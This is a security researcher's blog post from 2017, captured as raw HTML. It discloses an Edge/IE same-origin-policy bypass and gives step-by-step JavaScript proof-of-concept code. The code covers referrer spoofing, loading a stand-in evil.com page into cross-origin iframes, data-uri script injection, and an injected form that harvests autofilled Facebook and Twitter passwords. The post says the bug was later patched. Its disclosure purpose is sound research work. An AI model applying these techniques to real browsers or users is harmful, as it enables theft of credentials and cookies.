@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge) | BrokenBrowser - Fun with browser vulnerabilities</title>
+<meta name="keywords" content="">
+<meta name="description" content="Today we are going to steal Twitter and Facebook credentials from the user. The previous two SOP bypasses [1] [2] that allowed attackers to steal passwords and cookies were not patched in the latest update and this new one is more direct, easier and faster.
+Charles -our fictional hacked user- has obediently updated Windows last Tuesday and even changed his password, but he is not aware that the update did not fix the previous two issues (so he is still unprotected) and that there’s a new way to steal his most precious information.">
+<meta name="author" content="magicmac">
+<link rel="canonical" href="/posts/sop-bypass-uxss-stealing-credentials-pretty-fast/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6a98292fb8fa8cf0f3ba4042d4b75515c04267550f3ad49ff6271b5af9562443.css" integrity="sha256-apgpL7j6jPDzukBC1LdVFcBCZ1UPOtSf9icbWvlWJEM=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)" />
+<meta property="og:description" content="Today we are going to steal Twitter and Facebook credentials from the user. The previous two SOP bypasses [1] [2] that allowed attackers to steal passwords and cookies were not patched in the latest update and this new one is more direct, easier and faster.
+Charles -our fictional hacked user- has obediently updated Windows last Tuesday and even changed his password, but he is not aware that the update did not fix the previous two issues (so he is still unprotected) and that there’s a new way to steal his most precious information." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/sop-bypass-uxss-stealing-credentials-pretty-fast/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2017-05-10T16:12:23-03:00" />
+<meta property="article:modified_time" content="2017-05-10T16:12:23-03:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)"/>
+<meta name="twitter:description" content="Today we are going to steal Twitter and Facebook credentials from the user. The previous two SOP bypasses [1] [2] that allowed attackers to steal passwords and cookies were not patched in the latest update and this new one is more direct, easier and faster.
+Charles -our fictional hacked user- has obediently updated Windows last Tuesday and even changed his password, but he is not aware that the update did not fix the previous two issues (so he is still unprotected) and that there’s a new way to steal his most precious information."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "/posts/"
+    }
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)",
+      "item": "/posts/sop-bypass-uxss-stealing-credentials-pretty-fast/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)",
+  "name": "SOP bypass \/ UXSS - Stealing Credentials Pretty Fast (Edge)",
+  "description": "Today we are going to steal Twitter and Facebook credentials from the user. The previous two SOP bypasses [1] [2] that allowed attackers to steal passwords and cookies were not patched in the latest update and this new one is more direct, easier and faster.\nCharles -our fictional hacked user- has obediently updated Windows last Tuesday and even changed his password, but he is not aware that the update did not fix the previous two issues (so he is still unprotected) and that there’s a new way to steal his most precious information.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Today we are going to steal Twitter and Facebook credentials from the user. The previous two SOP bypasses [1] [2] that allowed attackers to steal passwords and cookies were not patched in the latest update and this new one is more direct, easier and faster.\nCharles -our fictional hacked user- has obediently updated Windows last Tuesday and even changed his password, but he is not aware that the update did not fix the previous two issues (so he is still unprotected) and that there’s a new way to steal his most precious information. Unfortunately, he has no idea that his browser, Microsoft Edge, will continue sharing his passwords with the world for several weeks because its patching cycle is infrequent compared to other browsers.\nIn a hurry? Watch the 40 seconds video or go straight to the proof of concept.\nThe vulnerability that follows describes how to steal the credentials and cookies from people using Microsoft Edge, and, if they are using the default password manager we will be able to steal them in plain-text pretty fast.\n[ Update: this bug was patched on 2017-06-13 ] This flaw, which Caballero disclosed today in a headache-inducing technical write-up […]\nHis phrase made me think I am not being clear enough, so I’ll do my best to improve on every post. Thanks a lot for pointing that out, Catalin!\nRemember: we are here to learn. I am presenting real evidence in the form of PoCs so everyone can judge better what to use. My personal wish is to have Microsoft patching faster and not as an afterthought. I believe Microsoft is a great company with amazing products, but their current policies are ridiculous. Change, Microsoft! Think and change.\nAbstract A server-redirect combined with a data-uri end up bypassing the Same Origin Policy, which leads to all kind of vulnerabilities like stealing user passwords in plain-text (thanks to the password manager), grabbing cookies, spoofing the content and referrer, etc.\nThe bug happens because we can force a window to change its location as if the initiator were the window itself. For example, a tab hosting evil.com can change the location of a Paypal tab to bankofamerica.com, then BankofAmerica will receive Paypal as its referrer instead of evil, because Edge confused the real initiator of the request. If we apply the same idea to iframes in the target page plus a data-uri with code, we can achieve a full SOP bypass.\nAlso, using a very simple injection we will get user passwords immediately. In our previous SOP bypass we were stealing passwords by logging out the user expecting Edge to autocomplete, but after applying an Occam’s razor to the code I found that we don’t even need to change the location.\nBoth Edge and IE confuse the initiator of a request when we change the location of a tab in the middle of a server-redirect. We used this technique to inject iframes everywhere, but let’s recap and use it here to spoof the referrer. We’ll make whatsmyreferrer think we are coming from microsoft.com.\nw = window.open(\"redir.php?URL=https://www.microsoft.com\", \"WIN\"); w.setTimeout('alert(\"Wait until the redirection starts\")'); w.location.href = \"https://www.whatismyreferer.com\"; // Does not work We need the target window to change its own URL. Let’s move that to the setTimeout:\nw = window.open(\"redir.php?URL=https://www.microsoft.com\", \"WIN\"); w.myself = w; // Self reference saved in the new window w.setTimeout('alert(\"Wait until the redirection starts\")'+ 'myself.location.href = \"https://www.whatismyreferer.com\"'); The code above looks good, but Edge will destroy the self-reference variable myself when doing the redirect, but there’s a trick to prevent that: place the reference inside any built-in JS object, like Math. Let’s change that, watch how the variable “myself” is part of the Math object.\nw = window.open(\"redir.php?URL=https://www.microsoft.com\", \"WIN\"); w.Math.myself = w; // Now in the Math object! // Crashes below w.setTimeout('alert(\"Wait until the redirection starts\")'+ 'Math.myself.location.href = \"https://www.whatismyreferer.com\"'); That’s good, but Edge developers have been poking on that code lately, and now it crashes [Fail Fast Exception]. It is a non-exploitable crash that happens apparently when trying to execute code in the “not-so-ready” window. But we don’t really care about that because there is a workaround to avoid the crash: window.open with javascript code. What a paradox! Instead of trying to exploit a crash we are trying to avoid it. 🙂 Anyway, the following code will run our bits indirectly, making the new window happy:\n// Not crashing anymore! w = window.open(\"redir.php?URL=https://www.microsoft.com\", \"WIN\"); w.Math.myself = w; window.open(\"javascript:\" + \"alert('Wait until the redirection starts');\" + \"Math.myself.location = 'https://www.whatismyreferer.com'\", \"WIN\"); [ Test Live PoC #4 ] Great. We have another referrer spoof. If we want this to work on IE, we just need to add an execScript(“Math”) forcing the browser to instantiate the Math object before using it.\nw = window.open(\"redir.php?URL=https://www.microsoft.com\", \"WIN\"); w.execScript(\"Math\"); // Forces IE to instantiate the Math object w.Math.myself = w; window.open(\"javascript:\" + \"alert('Wait until the redirection starts');\" + \"Math.myself.location = 'https://www.whatismyreferer.com'\", \"WIN\"); Setting the location of an iframe Let’s try the same thing, but setting the location of an iframe instead of the top window. This is a bypass of the SuperNavigate, something that we’ve seen in the recently patched Fake Ticket to the Intranet Zone post. The name SuperNavigate comes from the binary functions in EdgeHtml.dll and essentially, it is just the power to change the location of an iframe from a window on a different domain. For example, opening a new window on bankofamerica.com and changing the location of any of its iframes.\nThis is super-easy, just add the window/iframe index to the code above and we are done. For example, if we want to change the location of the first iframe in the target page we would do:\n// Load badbits.html in the first iframe of the target window Math.myself[0].location = 'https://evil.com/badbits.html'; Remember that most sites use hidden iframes to do postbacks and visible ones for advertising. Bank of America uses iframes so let’s use it as our target. I’ve created a simple html which prompts the user to enter the password, but it looks legit when rendered in bankofamerica.\nw = window.open(\"redir.php?URL=https://www.bankofamerica.com\", \"WIN\"); w.Math.myself = w; window.open(\"javascript:\" + \"alert('Wait until the redirection happens');\" + \"Math.myself[0].location = 'https://www.cracking.com.ar/demos/opendata/prompt.html'\", \"WIN\"); The prompt above is coming from cracking.com.ar so it can’t access the top window. Anyway, let’s try to achieve a real SOP bypass!\nSetting the location of an iframe to a data-uri Now that we can change the location of iframes, the game is almost over. If we set a data-uri with javascript code instead of a real location, it will execute almost in the context of its parent/originator. To be clear and following the example of bankofamerica, if we change the URL to a data-uri, like this:\nMath.myself[0].location = 'data:text/html,'; On Microsoft Edge, the alert above will execute in its own isolated context, but a simple document.write after the document has been loaded will set its origin to match its parent/originator. Observe the code below where we show the document.domain: it now matches its parent, SOP bypass.\nMath.myself[0].location = 'data:text/html,'; Excellent! We have a full SOP bypass again, but don’t think that this last part has the culprit, bug hunter. The main problem happens because we are allowed to set locations on behalf of other origins. That’s really bad.\nLet’s try that on Google, but but instead of showing the domain, just the cookies:\n[ Test Live PoC #3 ] Grabbing passwords pretty fast In our previous UXSS we logged out the user to force Edge auto-complete the password, but I realized later that Edge will autocomplete any input-password box as long as it is in the proper domain and has this format (newlines/spaces not needed).\nThat’s it! If we inject that code in domains with saved passwords, Edge will immediately autocomplete them. This means that we don’t even need to move the user to login-pages anymore. In fact, it does not matter if we add events, names, classes, or anything to those inputs, Edge will obediently fill them out. For example, if we take the user to facebook.com and inject this code, it will immediately alert the saved password in plain-text.\nCheck out the first two PoCs where we show the username and password of Facebook and Twitter!\n[ Test Live PoCs #1 and #2 ] [ Video PoC ] [ All PoCs in a zip] Conclusion We’ve seen how faking the originator leads to a referrer spoof, but thanks to the existence of data-uris and the fact that most sites render iframes, we can end up turning this vulnerability into a full SOP bypass. Then, because the password manager tries to be smart and complete everything without checking too much, we can simply render a universal snipped of code that will work everywhere.\nIn my opinion, Microsoft Edge is making huge progress in the memory corruption area and sandboxing, but basic design issues are still there. I hope this changes soon. Good luck to my friends at Microsoft and keep pushing until the people with bad ideas change their minds, or change their jobs.\nMicrosoft: please patch faster. Move Edge to the Windows Store and update its security issues as frequently as needed. Audit MSRC constantly and do not forget that they represent the company when talking to researchers. Not everyone is capable of doing that. I wholeheartedly wish you the best.\nSpecial thanks to 1lastBr3ath for pointing me out a few typos on this post. Corrected!\nHave a nice day!\nManuel.\n",
+  "wordCount" : "1721",
+  "inLanguage": "en",
+  "datePublished": "2017-05-10T16:12:23-03:00",
+  "dateModified": "2017-05-10T16:12:23-03:00",
+  "author":{
+    "@type": "Person",
+    "name": "magicmac"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "/posts/sop-bypass-uxss-stealing-credentials-pretty-fast/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "BrokenBrowser - Fun with browser vulnerabilities",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="/" accesskey="h" title="BrokenBrowser - Fun with browser vulnerabilities (Alt + H)">BrokenBrowser - Fun with browser vulnerabilities</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)
+    </h1>
+    <div class="post-meta"><span title='2017-05-10 16:12:23 -0300 -03'>May 10, 2017</span>&nbsp;·&nbsp;magicmac
+
+</div>
+  </header> 
+  <div class="post-content"><p>Today we are going to steal Twitter and Facebook credentials from the user. The previous two SOP bypasses <a href="https://www.brokenbrowser.com/sop-bypass-abusing-read-protocol/">[1]</a> <a href="https://www.brokenbrowser.com/sop-bypass-uxss-tweeting-like-charles-darwin/">[2]</a> that allowed attackers to steal passwords and cookies <a href="https://goo.gl/8GxFQC">were not patched in the latest update</a> and this new one is more direct, easier and faster.</p>
+<p>Charles -our fictional hacked user- has obediently updated Windows last Tuesday and even changed his password, but he is not aware that the update did not fix the previous two issues (so he is still unprotected) and that there’s a <strong>new way to steal his most precious information</strong>. Unfortunately, he has no idea that his browser, Microsoft Edge, will continue sharing his passwords with the world for several weeks because its <a href="https://www.brokenbrowser.com/on-patching-security-bugs/">patching cycle is infrequent compared to other browsers</a>.</p>
+<p>In a hurry? Watch the <a href="https://www.youtube.com/watch?v=vO6LRO6Sgcg&amp;list=PL12o0t84rBX_oDmz93NwGNgTDiWf-HfUY">40 seconds video</a> or go straight to the <a href="https://www.cracking.com.ar/demos/opendata/">proof of concept</a>.</p>
+<p>The vulnerability that follows describes <strong>how to steal the credentials and cookies from people using Microsoft Edge</strong>, and, if they are using the default password manager we will be able to steal them in plain-text pretty fast.</p>
+<h3 id="-update-this-bug-was-patched-on-2017-06-13-"><strong>[ Update: this bug was patched on 2017-06-13 ]</strong><a hidden class="anchor" aria-hidden="true" href="#-update-this-bug-was-patched-on-2017-06-13-">#</a></h3>
+<!-- raw HTML omitted -->
+<blockquote>
+<p>This flaw, which Caballero disclosed today in a <strong>headache-inducing</strong> technical write-up […]</p>
+</blockquote>
+<p>His phrase made me think I am not being clear enough, so I’ll do my best to improve on every post. Thanks a lot for pointing that out, Catalin!</p>
+<p>Remember: we are here to learn. I am presenting real evidence in the form of PoCs so everyone can judge better what to use. My personal wish is to have <a href="https://www.brokenbrowser.com/on-patching-security-bugs/">Microsoft patching faster</a> and not as <a href="https://twitter.com/magicmac2000/status/862063751742337024">an afterthought</a>. I believe Microsoft is a great company with amazing products, but their <a href="https://www.brokenbrowser.com/on-patching-security-bugs/">current policies are ridiculous</a>. Change, Microsoft! Think and change.</p>
+<h2 id="abstract">Abstract<a hidden class="anchor" aria-hidden="true" href="#abstract">#</a></h2>
+<p>A server-redirect combined with a data-uri end up bypassing the Same Origin Policy, which leads to all kind of vulnerabilities like stealing user passwords in plain-text (thanks to the password manager), grabbing cookies, spoofing the content and referrer, etc.</p>
+<p>The bug happens because we can force a window to change its location <strong>as if the initiator were the window itself</strong>. For example, a tab hosting evil.com can change the location of a Paypal tab to bankofamerica.com, then BankofAmerica will receive Paypal as its referrer instead of evil, <strong>because Edge confused the real initiator of the request</strong>. If we apply the same idea to iframes in the target page plus a data-uri with code, we can achieve a full SOP bypass.</p>
+<p>Also, using a very simple injection we will get user passwords immediately. In our previous <a href="https://www.brokenbrowser.com/sop-bypass-uxss-tweeting-like-charles-darwin/">SOP bypass we were stealing passwords</a> by logging out the user expecting Edge to autocomplete, but after applying an Occam’s razor to the code I found that we don’t even need to change the location.</p>
+<!-- raw HTML omitted -->
+<p>Both Edge and IE confuse the initiator of a request when we change the location of a tab in the middle of a server-redirect. We used this technique to <a href="https://www.brokenbrowser.com/uxss-ie-htmlfile/">inject iframes everywhere</a>, but let’s recap and use it here to spoof the referrer. We’ll make whatsmyreferrer think we are coming from microsoft.com.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Direct location change does not work&#34;&gt;w = window.open(&#34;redir.php?URL=https://www.microsoft.com&#34;, &#34;WIN&#34;);
+w.setTimeout(&#39;alert(&#34;Wait until the redirection starts&#34;)&#39;);
+w.location.href = &#34;https://www.whatismyreferer.com&#34;; // Does not work
+</code></pre><p>We need the target window to change its own URL. Let’s move that to the setTimeout:</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;myself variable is destroyed&#34;&gt;w = window.open(&#34;redir.php?URL=https://www.microsoft.com&#34;, &#34;WIN&#34;);
+w.myself = w; // Self reference saved in the new window
+w.setTimeout(&#39;alert(&#34;Wait until the redirection starts&#34;)&#39;+
+             &#39;myself.location.href = &#34;https://www.whatismyreferer.com&#34;&#39;);
+</code></pre><p>The code above looks good, but Edge will destroy the self-reference variable <strong>myself</strong> when doing the redirect, but there’s a trick to prevent that: place the reference inside any built-in JS object, like Math. Let’s change that, watch how the variable “myself” is part of the Math object.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;myself variable in Math object&#34;&gt;w = window.open(&#34;redir.php?URL=https://www.microsoft.com&#34;, &#34;WIN&#34;);
+w.Math.myself = w; // Now in the Math object!
+
+// Crashes below
+w.setTimeout(&#39;alert(&#34;Wait until the redirection starts&#34;)&#39;+
+             &#39;Math.myself.location.href = &#34;https://www.whatismyreferer.com&#34;&#39;);
+</code></pre><p>That’s good, but Edge developers have been poking on that code lately, and now it crashes [Fail Fast Exception]. It is a non-exploitable crash that happens <em>apparently</em> when trying to execute code in the “not-so-ready” window. But we don’t really care about that because there is a workaround to avoid the crash: window.open with javascript code. What a paradox! Instead of trying to exploit a crash we are trying to avoid it. 🙂 Anyway, the following code will run our bits indirectly, making the new window happy:</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Working PoC&#34;&gt;// Not crashing anymore!
+w = window.open(&#34;redir.php?URL=https://www.microsoft.com&#34;, &#34;WIN&#34;);
+w.Math.myself = w;
+window.open(&#34;javascript:&#34; +
+               &#34;alert(&#39;Wait until the redirection starts&#39;);&#34; +
+               &#34;Math.myself.location = &#39;https://www.whatismyreferer.com&#39;&#34;,
+            &#34;WIN&#34;);
+</code></pre><p><img loading="lazy" src="/2017/05/01-referrer-spoof.png" alt=""  />
+</p>
+<h2 id="-test-live-poc-4httpswwwcrackingcomardemosopendata-">[ <a href="https://www.cracking.com.ar/demos/opendata/">Test Live PoC #4</a> ]<a hidden class="anchor" aria-hidden="true" href="#-test-live-poc-4httpswwwcrackingcomardemosopendata-">#</a></h2>
+<p>Great. We have another referrer spoof. If we want this to work on IE, we just need to add an <strong>execScript(“Math”)</strong> forcing the browser to instantiate the Math object before using it.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Working PoC for IE&#34;&gt;w = window.open(&#34;redir.php?URL=https://www.microsoft.com&#34;, &#34;WIN&#34;);
+w.execScript(&#34;Math&#34;); // Forces IE to instantiate the Math object
+w.Math.myself = w;
+window.open(&#34;javascript:&#34; +
+               &#34;alert(&#39;Wait until the redirection starts&#39;);&#34; +
+               &#34;Math.myself.location = &#39;https://www.whatismyreferer.com&#39;&#34;,
+            &#34;WIN&#34;);
+</code></pre><h2 id="setting-the-location-of-an-iframe">Setting the location of an iframe<a hidden class="anchor" aria-hidden="true" href="#setting-the-location-of-an-iframe">#</a></h2>
+<p>Let’s try the same thing, but setting the location of an iframe instead of the top window. This is a bypass of the SuperNavigate, something that we’ve seen in the recently patched <a href="https://www.brokenbrowser.com/free-ticket-to-the-intranet-zone/">Fake Ticket to the Intranet Zone</a> post. The name <strong>SuperNavigate</strong> comes from the binary functions in EdgeHtml.dll and essentially, it is just the power to change the location of an iframe from a window on a different domain. For example, opening a new window on bankofamerica.com and changing the location of any of its iframes.</p>
+<p>This is super-easy, just add the window/iframe index to the code above and we are done. For example, if we want to change the location of the first iframe in the target page we would do:</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Working PoC for IE&#34;&gt;// Load badbits.html in the first iframe of the target window
+Math.myself[0].location = &#39;https://evil.com/badbits.html&#39;;
+</code></pre><p>Remember that most sites use hidden iframes to do postbacks and visible ones for advertising. Bank of America uses iframes so let’s use it as our target. I’ve created a simple html which prompts the user to enter the password, but it looks legit when rendered in bankofamerica.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Setting iframe location&#34;&gt;w = window.open(&#34;redir.php?URL=https://www.bankofamerica.com&#34;, &#34;WIN&#34;);
+w.Math.myself = w;
+window.open(&#34;javascript:&#34; +
+               &#34;alert(&#39;Wait until the redirection happens&#39;);&#34; +
+               &#34;Math.myself[0].location = &#39;https://www.cracking.com.ar/demos/opendata/prompt.html&#39;&#34;,
+            &#34;WIN&#34;);
+</code></pre><p><img loading="lazy" src="/2017/05/02-iframe-location-change.png" alt=""  />
+</p>
+<p>The prompt above is coming from cracking.com.ar so it can’t access the top window. Anyway, let’s try to achieve a real SOP bypass!</p>
+<h2 id="setting-the-location-of-an-iframe-to-a-data-uri">Setting the location of an iframe to a data-uri<a hidden class="anchor" aria-hidden="true" href="#setting-the-location-of-an-iframe-to-a-data-uri">#</a></h2>
+<p>Now that we can change the location of iframes, the game is almost over. If we set a data-uri with javascript code instead of a real location, it will execute <strong>almost</strong> in the context of its parent/originator. To be clear and following the example of bankofamerica, if we change the URL to a data-uri, like this:</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Isolated Context&#34;&gt;Math.myself[0].location = &#39;data:text/html,&lt;script&gt;alert(&#34;I am isolated from the top!&#34;)&lt;/script&gt;&#39;;
+</code></pre><p>On Microsoft Edge, the alert above will execute in its own isolated context, but a simple document.write after the document has been loaded will set its origin to match its parent/originator. Observe the code below where we show the document.domain: it now matches its parent, <strong>SOP bypass</strong>.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;SOP bypass / UXSS&#34;&gt;Math.myself[0].location = &#39;data:text/html,&lt;script&gt;&#39; +
+   &#39;window.onload = function(){&#39; +
+   &#39;   document.write(&#34;&lt;script&gt;alert(document.domain)&lt;\\\/script&gt;&#34;);&#39; +
+   &#39;   document.close();&#39; +
+   &#39;}&lt;/script&gt;&#39;;
+</code></pre><p>Excellent! We have a full SOP bypass again, but don’t think that this last part has the culprit, bug hunter. The main problem happens because we are allowed to set locations on behalf of other origins. That’s really bad.</p>
+<p>Let’s try that on Google, but but instead of showing the domain, just the cookies:</p>
+<p><img loading="lazy" src="/2017/05/03-data-uri-sop-bypass.png" alt=""  />
+</p>
+<h2 id="-test-live-poc-3httpswwwcrackingcomardemosopendata-">[ <a href="https://www.cracking.com.ar/demos/opendata/">Test Live PoC #3</a> ]<a hidden class="anchor" aria-hidden="true" href="#-test-live-poc-3httpswwwcrackingcomardemosopendata-">#</a></h2>
+<h2 id="grabbing-passwords-pretty-fast">Grabbing passwords pretty fast<a hidden class="anchor" aria-hidden="true" href="#grabbing-passwords-pretty-fast">#</a></h2>
+<p>In our previous <a href="https://www.brokenbrowser.com/sop-bypass-uxss-tweeting-like-charles-darwin/">UXSS we logged out the user to force Edge auto-complete the password</a>, but I realized later that Edge will autocomplete <strong>any input-password box</strong> as long as it is in the proper domain and has this format (newlines/spaces not needed).</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:xhtml decode:true&#34; title=&#34;Microsoft Edge Password Manager AutoComplete&#34;&gt;&lt;form&gt;
+  &lt;input /&gt;
+  &lt;input type=&#34;password&#34; /&gt;
+&lt;/form&gt;
+</code></pre><p>That’s it! If we inject that code in domains with saved passwords, Edge will immediately autocomplete them. This means that we don’t even need to move the user to login-pages anymore. In fact, it does not matter if we add events, names, classes, or anything to those inputs, Edge will obediently fill them out. For example, if we take the user to facebook.com and inject this code, it will immediately alert the saved password in plain-text.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false whitespace-before:1 whitespace-after:1 lang:xhtml decode:true &#34; title=&#34;Microsoft Edge Password Manager AutoComplete&#34;&gt;&lt;form&gt;
+  &lt;input /&gt;
+  &lt;input type=&#34;password&#34; onchange=&#34;alert(this.value)&#34; /&gt;
+&lt;/form&gt;
+</code></pre><p>Check out the first two PoCs where we show the username and password of Facebook and Twitter!</p>
+<h2 id="-test-live-pocs-1-and-2httpswwwcrackingcomardemosopendata-">[ <a href="https://www.cracking.com.ar/demos/opendata/">Test Live PoCs #1 and #2</a> ]<a hidden class="anchor" aria-hidden="true" href="#-test-live-pocs-1-and-2httpswwwcrackingcomardemosopendata-">#</a></h2>
+<h2 id="-video-pochttpswwwyoutubecomwatchvvo6lro6sgcglistpl12o0t84rbx_odmz93nwgngtdiwf-hfuy---all-pocs-in-a-ziphttpsgooglzhr4cu">[ <a href="https://www.youtube.com/watch?v=vO6LRO6Sgcg&amp;list=PL12o0t84rBX_oDmz93NwGNgTDiWf-HfUY">Video PoC</a> ] [ <a href="https://goo.gl/zHr4Cu">All PoCs in a zip</a>]<a hidden class="anchor" aria-hidden="true" href="#-video-pochttpswwwyoutubecomwatchvvo6lro6sgcglistpl12o0t84rbx_odmz93nwgngtdiwf-hfuy---all-pocs-in-a-ziphttpsgooglzhr4cu">#</a></h2>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>We’ve seen how faking the originator leads to a referrer spoof, but thanks to the existence of data-uris and the fact that most sites render iframes, we can end up turning this vulnerability into a full SOP bypass. Then, because the password manager tries to be smart and complete everything without checking too much, we can simply render a universal snipped of code that will work everywhere.</p>
+<p>In my opinion, Microsoft Edge is making huge progress in the memory corruption area and sandboxing, but basic design issues are still there. I hope this changes soon. Good luck to my friends at Microsoft and keep pushing until the people with bad ideas change their minds, or change their jobs.</p>
+<p><strong>Microsoft: please patch faster.</strong> Move Edge to the Windows Store and update <strong>its security issues</strong> as frequently as needed. Audit MSRC constantly and do not forget that they represent the company when talking to researchers. Not everyone is capable of doing that. I wholeheartedly wish you the best.</p>
+<p>Special thanks to <a href="https://twitter.com/1lastBr3ath">1lastBr3ath</a> for pointing me out a few typos on this post. Corrected!</p>
+<p>Have a nice day!</p>
+<p><a href="https://twitter.com/magicmac2000">Manuel</a>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="/">BrokenBrowser - Fun with browser vulnerabilities</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
